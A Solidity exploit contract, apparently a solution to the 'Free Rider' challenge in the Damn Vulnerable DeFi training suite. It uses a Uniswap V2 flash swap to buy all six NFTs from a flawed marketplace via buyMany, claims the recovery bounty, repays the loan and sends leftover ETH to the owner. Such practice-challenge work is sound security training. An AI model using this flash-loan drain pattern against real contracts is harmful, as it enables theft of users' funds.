// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {DamnValuableNFT} from "../DamnValuableNFT.sol";
import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {console} from "forge-std/Test.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract HackFreeRiderNFTMarketplace is IERC721Receiver {
    uint constant AMOUNT_OF_NFTS = 6;
    address owner;
    DamnValuableNFT nft;
    IUniswapV2Pair pair;
    FreeRiderNFTMarketplace marketplace;
    WETH immutable weth;
    address recoveryManager;
   
   constructor(IUniswapV2Pair _pair, FreeRiderNFTMarketplace _marketplace, WETH _weth, DamnValuableNFT _nft, address _recovery){
    owner = msg.sender;
    pair = _pair;
    marketplace = _marketplace;
    weth = _weth;
    nft = _nft;
    recoveryManager = _recovery;
   }

   function flashLoan() external{
    // get a flashloan for 15 WETH
    pair.swap(15 ether, 0, address(this), bytes("0x1"));
   }

    // gets tokens/WETH via a V2 flash swap, swaps for the ETH/tokens on V1, repays V2, and keeps the rest!
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external{
        // receive ETH for WETH
        weth.withdraw(amount0);

         uint256[] memory ids = new uint256[](AMOUNT_OF_NFTS);
        for (uint256 i = 0; i < AMOUNT_OF_NFTS; i++) {
            ids[i] = i;
        }

        // buy all the tokens for 15 ether
        marketplace.buyMany{value: 15 ether}(ids);

        // return the tokens to the recovery manager and collect the bounty
        bytes memory customData = abi.encode(address(this));
        for (uint256 i = 0; i < AMOUNT_OF_NFTS; i++) {
            nft.safeTransferFrom(address(this), address(recoveryManager), ids[i], customData);
        }
        
        // repay flashloan
        uint256 repayAmount = amount0 * 103 / 100;

        weth.deposit{value: repayAmount}();

        assert(weth.transfer(msg.sender, repayAmount)); // return tokens to V2 pair

        // send the rest back to the player account
        (bool success,) = owner.call{value: address(this).balance}(new bytes(0)); // keep the rest! (ETH)
        assert(success);
    }

    receive() external payable {}

    // Read https://eips.ethereum.org/EIPS/eip-721 for more info on this function
    function onERC721Received(address, address, uint256 _tokenId, bytes memory _data)
        external
        override
        returns (bytes4)
    {
        return IERC721Receiver.onERC721Received.selector;
    }
}
